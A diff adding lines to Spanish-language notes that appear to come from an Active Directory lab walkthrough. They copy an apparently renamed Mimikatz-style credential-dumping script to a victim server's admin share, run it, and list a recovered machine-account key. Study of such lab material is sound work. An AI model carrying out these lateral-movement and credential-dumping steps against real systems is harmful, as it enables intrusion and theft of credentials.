@@ -632,3 +632,22 @@ Invoke-TheKat -Command $Pwn
 ```
 
 Ahora nos transferiremos el archivo a la maquina de *dcorp-adminsrv*
+```shell
+Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+```
+
+Y en la maquiona victima navegaremos a *C:\'Program Files'* y lo ejecutamos
+```shell
+[dcorp-adminsrv]
+ .\Invoke-TheKatEx-keys-std97.ps1
+```
+
+Qui encontramos credenciales de los ususarios *dcorp-adminsrv$*, *appadmin* y *websvc*
+```ad-hint
+dcorp-adminsrv$ -> e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
+websvc -
+```
+
+```ad-info
+EL uso del $ detras de un nombre de usuario, quiere decir que es una cuenta de equipo
+```
